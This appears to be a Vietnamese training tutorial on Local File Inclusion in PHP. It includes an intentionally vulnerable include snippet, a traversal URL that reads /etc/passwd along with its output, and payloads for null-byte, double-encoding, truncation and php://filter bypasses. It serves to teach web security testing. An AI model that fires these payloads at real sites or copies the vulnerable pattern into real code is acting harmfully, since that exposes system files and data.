# LFI (File Inclusion Vulnerability)

## 1. LFI là gì
LFI là một kĩ thuật tấn công cho phép kể tấn công có thể xem các tệp tin trên máy chủ từ xa của victim mà không cần không cần nhìn thấy hoặc có thể thực thi các mã vào 1 mục tiêu bất kì trên trang web.

Điều này xảy ra đa phần là các trang web có chứa ngôn ngữ PHP, các function dùng để gọi file khác vào như `require`, `include`, `include_once`, `require_once`. 

<p align="center">
  <img src="https://www.immuniweb.com/images/vulnerability/previews/php-file-inclusion-cwe-98.jpg" />
</p>
<center><small>`CWE-98 by PLOVER | Submission Date: 2006-07-19`</small></center>

Hiện nay thì các trang web ngoài sử dụng PHP còn có NodeJS và Python có khả năng lỗi ít hơn nhưng không phải là không có. Tương tự như php thì NodeJS có 1 số function như `require()`, `fs.readFile()`, `fs.readFileSync()`...
Hiện nay thì LFI/RFI được đưa vào top 10 OWASP được coi là "tiêu chuẩn" trong việc kiểm thử website.

## 2. Trong thực tế LFI được khai thác như thế nào

Trên thực tế thì có khá nhiều cách để khai thác lỗ hổng này:

Ví dụ vô cùng điển hình để đọc file passwd
```php
<?php
include $_GET['page'];
?>

```
```
http://example.com/index.php?page=../../../etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
hyp:x:1000:1000:,,,:/home/hyp:/bin/bash
```

### a. Null byte (%00)

Null byte dùng để bypass các kí tự đằng sau nó

```php
<?php
include $_GET['page'].'.php';
?>
```

```
http://example.com/index.php?page=../../../etc/passwd%00
```
(Từ phiên bản PHP > 5.4 vấn đề này đã được giải quyét)
### b. Encoding Bypass:

Các kí tự đặc biệt có thể cần encoding URL 2 lần

```
/ => %2F => %252F
& => %26 => %2526
% => %25 => %2525
= => %3D => %253D
```
### c. Path truncation
Kĩ thuật này dùng dể bỏ qua phần nối đằng sau có kí tự nhiều hơn.

```php
<?php
include $_GET['page'].'.php';
?>
```

Ta sẽ gửi param GET vượt quá 4096 kí tự.

### d. PHP Wrapper

Điều này yêu mã code tại file muốn đọc bắt buộc phải encode theo 1 cách gì đó trước khi gửi cho người dùng (phổ biến trong CTF)

```
?page=php://filter/read=string.rot13/resource=index
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/zlib.deflate/convert.base64-encode/resource=
```

Ngoài ra còn có `zip://`, `data://`, `expect://`, ` input://`, ` phar://`,...

Demo Notepad LFI: https://lfi-kcsc-training.glitch.me
Source: [hypnguyen1209/demo-lfi](https://github.com/hypnguyen1209/demo-lfi)


## 3. Tham khảo
https://securitydaily.net/tan-cong-file-inclusion/

https://www.immuniweb.com/vulnerability/php-file-inclusion.html

https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers
